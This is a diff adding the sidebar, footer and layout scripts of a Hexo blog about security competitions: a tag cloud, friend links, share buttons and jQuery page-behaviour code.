+		
+		  
+			<li><a href="/categories/安全竞赛/" title="安全竞赛">安全竞赛<sup>21</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/编程开发/" title="编程开发">编程开发<sup>16</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/docker/" title="docker">docker<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/redis/" title="redis">redis<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Writeup/" title="Writeup">Writeup<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/山东省大学生信息安全竞赛/" title="山东省大学生信息安全竞赛">山东省大学生信息安全竞赛<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/安恒杯Web安全测试大赛/" title="安恒杯Web安全测试大赛">安恒杯Web安全测试大赛<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/汇编/" title="汇编">汇编<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/学习笔记/" title="学习笔记">学习笔记<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Docker/" title="Docker">Docker<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/自动化/" title="自动化">自动化<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/流量混淆/" title="流量混淆">流量混淆<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻击脚本/" title="攻击脚本">攻击脚本<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/XAMPP/" title="XAMPP">XAMPP<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/error/" title="error">error<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cve-2019-0708/" title="cve_2019_0708">cve_2019_0708<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/msf/" title="msf">msf<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Jenkins/" title="Jenkins">Jenkins<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://www.cnblogs.com/test404" target="_blank" title="胖虎">胖虎</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://p0desta.com" target="_blank" title="p0desta">p0desta</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.test407.cn" target="_blank" title="薯片博客">薯片博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://alem0n.github.io" target="_blank" title="lem0n">lem0n</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> Rise and rise again until lambs become lions <br/>
+			Everyone can cook, but only those who dare to try can become the real chef.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		<a href="https://github.com/flag0" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:root@flag0.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2019 
+		
+		<a href="/about" target="_blank" title="GetFlag">GetFlag</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
